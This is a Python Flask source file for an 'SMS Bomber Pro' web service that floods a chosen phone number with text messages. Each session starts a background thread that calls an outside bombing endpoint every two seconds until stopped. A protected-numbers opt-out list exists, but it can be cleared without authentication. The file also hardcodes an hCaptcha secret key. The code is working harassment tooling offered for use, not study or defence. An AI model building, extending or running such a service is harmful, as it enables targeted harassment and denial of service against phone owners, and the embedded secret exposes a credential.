from flask import Flask, request, jsonify, session
from flask_cors import CORS
import requests
import threading
import time
import json
import os
import uuid
import re
from datetime import datetime

# Try to import GitHub storage, fallback to local storage
try:
    from github_storage import load_protected_numbers, save_protected_numbers
    print("✅ Using GitHub storage")
except ImportError:
    print("⚠️  GitHub storage not available, using local storage")
    # Fallback functions
    def load_protected_numbers():
        protected_numbers = set()
        try:
            if os.path.exists('protected_numbers.json'):
                with open('protected_numbers.json', 'r') as f:
                    numbers_list = json.load(f)
                    protected_numbers = set(numbers_list)
                print(f"✅ Loaded {len(protected_numbers)} protected numbers from local file")
        except Exception as e:
            print(f"❌ Error loading from local file: {e}")
        return protected_numbers
    
    def save_protected_numbers(protected_numbers):
        try:
            numbers_list = list(protected_numbers)
            with open('protected_numbers.json', 'w') as f:
                json.dump(numbers_list, f, indent=2)
            print(f"✅ Saved {len(protected_numbers)} protected numbers to local file")
            return True
        except Exception as e:
            print(f"❌ Error saving to local file: {e}")
            return False

app = Flask(__name__)

# SIMPLE CORS CONFIGURATION - FIXED
CORS(app, origins=[
    "http://localhost:3000",
    "http://localhost:5000",
    "http://127.0.0.1:3000", 
    "http://127.0.0.1:5000",
    "https://*.netlify.app",
    "https://*.netlify.com"
])

app.secret_key = os.environ.get('SECRET_KEY', 'sms-bomber-secret-key-2024')

# Global storage for protected numbers
protected_numbers = set()

# Store active sessions per user
user_sessions = {}

# hCaptcha configuration
HCAPTCHA_SECRET_KEY = "ES_595b1aa25093495f9374ddb1a010134f"
HCAPTCHA_SITE_KEY = "652c20cc-4e0c-486e-9cc4-d61a1d186b80"

# Bombing API Configuration
BOMBING_API_URL = "https://drk-venom.sevalla.app/bomb"

# Load protected numbers when server starts
protected_numbers = load_protected_numbers()

class BombingSession:
    def __init__(self, phone_number, user_id):
        self.phone_number = phone_number
        self.user_id = user_id
        self.session_id = str(uuid.uuid4())
        self.start_time = datetime.now()
        self.sent_count = 0
        self.failed_count = 0
        self.is_running = False
        self.is_sending = False
        self.last_update = datetime.now()
        self.thread = None
        
    def start(self):
        self.is_running = True
        self.thread = threading.Thread(target=self._bombing_worker)
        self.thread.daemon = True
        self.thread.start()
        
    def stop(self):
        self.is_running = False
        if self.thread and self.thread.is_alive():
            self.thread.join(timeout=5)
            
    def _bombing_worker(self):
        while self.is_running:
            try:
                self.is_sending = True
                
                # Updated API call with new URL format
                bombing_url = f"{BOMBING_API_URL}?number={self.phone_number}"
                
                response = requests.get(bombing_url, timeout=30)
                
                if response.status_code == 200:
                    self.sent_count += 1
                    print(f"✅ SMS sent to {self.phone_number} | Total: {self.sent_count}")
                else:
                    self.failed_count += 1
                    print(f"❌ Failed to send SMS to {self.phone_number} | Status: {response.status_code}")
                    
            except Exception as e:
                self.failed_count += 1
                print(f"❌ Error sending SMS to {self.phone_number}: {str(e)}")
                
            finally:
                self.is_sending = False
                self.last_update = datetime.now()
                
            # Wait before next message
            time.sleep(2)
            
    def get_duration(self):
        delta = datetime.now() - self.start_time
        hours = delta.seconds // 3600
        minutes = (delta.seconds % 3600) // 60
        seconds = delta.seconds % 60
        return f"{hours:02d}:{minutes:02d}:{seconds:02d}"
        
    def to_dict(self):
        return {
            'phone_number': self.phone_number,
            'session_id': self.session_id,
            'start_time': self.start_time.isoformat(),
            'sent_count': self.sent_count,
            'failed_count': self.failed_count,
            'is_running': self.is_running,
            'is_sending': self.is_sending,
            'duration': self.get_duration(),
            'last_update': self.last_update.isoformat()
        }

def is_valid_phone_number(phone_number):
    """Validate phone number format"""
    # Remove all non-digit characters except +
    clean_number = re.sub(r'[^\d+]', '', phone_number)
    
    # Check for international format (+ followed by 10-15 digits)
    if clean_number.startswith('+'):
        digits_only = clean_number[1:]
        return len(digits_only) >= 10 and len(digits_only) <= 15 and digits_only.isdigit()
    
    # Check for local format (10 digits or 11 digits starting with 0)
    elif clean_number.startswith('0'):
        return len(clean_number) == 11 and clean_number.isdigit()
    
    # Check for 10-digit format
    else:
        return len(clean_number) == 10 and clean_number.isdigit()

def extract_base_number(phone_number):
    """Extract base number without country code for protection"""
    clean_number = re.sub(r'[^\d+]', '', phone_number)
    
    if clean_number.startswith('+'):
        # For international numbers, use last 10 digits
        return clean_number[-10:]
    elif clean_number.startswith('0'):
        # For local numbers with 0, remove the 0
        return clean_number[1:]
    else:
        # For 10-digit numbers, use as is
        return clean_number

def verify_hcaptcha(hcaptcha_response):
    """Verify hCaptcha response"""
    try:
        data = {
            'secret': HCAPTCHA_SECRET_KEY,
            'response': hcaptcha_response
        }
        response = requests.post('https://hcaptcha.com/siteverify', data=data, timeout=10)
        result = response.json()
        return result.get('success', False)
    except Exception as e:
        print(f"hCaptcha verification error: {e}")
        return False

def get_user_id():
    """Get or create user ID from session"""
    if 'user_id' not in session:
        session['user_id'] = str(uuid.uuid4())
    return session['user_id']

@app.route('/')
def home():
    return jsonify({
        'message': 'SMS Bomber Pro API',
        'status': 'running',
        'version': '2.0',
        'cors_enabled': True
    })

@app.route('/api/health', methods=['GET'])
def health_check():
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'protected_numbers_count': len(protected_numbers),
        'active_sessions': len(user_sessions)
    })

@app.route('/api/has_active_session', methods=['GET'])
def has_active_session():
    user_id = get_user_id()
    has_active = user_id in user_sessions and user_sessions[user_id].is_running
    return jsonify({'has_active_session': has_active})

@app.route('/api/start', methods=['POST'])
def start_bombing():
    try:
        data = request.get_json()
        phone_number = data.get('phone_number', '').strip()
        hcaptcha_response = data.get('hcaptcha_response', '')
        
        if not phone_number:
            return jsonify({'success': False, 'error': 'Phone number is required'})
        
        # Validate phone number format
        if not is_valid_phone_number(phone_number):
            return jsonify({'success': False, 'error': 'Invalid phone number format. Use 10-digit, 11-digit (starting with 0), or international format (+countrycode)'})
        
        # Verify hCaptcha
        if not verify_hcaptcha(hcaptcha_response):
            return jsonify({'success': False, 'error': 'CAPTCHA verification failed'})
        
        # Check if number is protected
        base_number = extract_base_number(phone_number)
        if base_number in protected_numbers:
            return jsonify({'success': False, 'error': 'This number is protected and cannot be bombed'})
        
        user_id = get_user_id()
        
        # Stop any existing session
        if user_id in user_sessions:
            user_sessions[user_id].stop()
        
        # Create and start new session
        bombing_session = BombingSession(phone_number, user_id)
        user_sessions[user_id] = bombing_session
        bombing_session.start()
        
        return jsonify({
            'success': True, 
            'message': f'Bombing session started for {phone_number}',
            'session_id': bombing_session.session_id
        })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/stop', methods=['POST'])
def stop_bombing():
    try:
        user_id = get_user_id()
        
        if user_id in user_sessions:
            user_sessions[user_id].stop()
            session_info = user_sessions[user_id].to_dict()
            del user_sessions[user_id]
            
            return jsonify({
                'success': True,
                'message': 'Bombing session stopped',
                'session': session_info
            })
        else:
            return jsonify({'success': False, 'error': 'No active session found'})
            
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/session', methods=['GET'])
def get_session():
    try:
        user_id = get_user_id()
        
        if user_id in user_sessions:
            session_data = user_sessions[user_id].to_dict()
            return jsonify(session_data)
        else:
            # Return empty session data
            return jsonify({
                'phone_number': '',
                'session_id': '',
                'start_time': datetime.now().isoformat(),
                'sent_count': 0,
                'failed_count': 0,
                'is_running': False,
                'is_sending': False,
                'duration': '00:00:00',
                'last_update': datetime.now().isoformat()
            })
            
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/protect', methods=['POST'])
def protect_number():
    try:
        data = request.get_json()
        phone_number = data.get('phone_number', '').strip()
        
        if not phone_number:
            return jsonify({'success': False, 'error': 'Phone number is required'})
        
        # Validate phone number format
        if not is_valid_phone_number(phone_number):
            return jsonify({'success': False, 'error': 'Invalid phone number format. Use 10-digit, 11-digit (starting with 0), or international format (+countrycode)'})
        
        base_number = extract_base_number(phone_number)
        
        if not base_number:
            return jsonify({'success': False, 'error': 'Invalid phone number format'})
        
        protected_numbers.add(base_number)
        save_protected_numbers(protected_numbers)
        
        return jsonify({'success': True, 'message': f'Number {base_number} protected successfully'})
    
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/protected-numbers', methods=['GET'])
def get_protected_numbers():
    return jsonify({
        'protected_numbers': list(protected_numbers),
        'count': len(protected_numbers)
    })

@app.route('/api/clear-protected', methods=['POST'])
def clear_protected_numbers():
    try:
        protected_numbers.clear()
        save_protected_numbers(protected_numbers)
        return jsonify({'success': True, 'message': 'All protected numbers cleared'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 4747))
    print("=" * 60)
    print("🚀 SMS Bomber Pro API Starting...")
    print(f"📍 Port: {port}")
    print(f"🌐 Bombing API: {BOMBING_API_URL}")
    print(f"📱 Protected Numbers: {len(protected_numbers)}")
    print("🔓 Authentication: DISABLED")
    print("🌍 CORS: ENABLED (Netlify & localhost)")
    print("🤖 GitHub Auto-Save: ENABLED")
    print("=" * 60)
    app.run(host='0.0.0.0', port=port, debug=False)
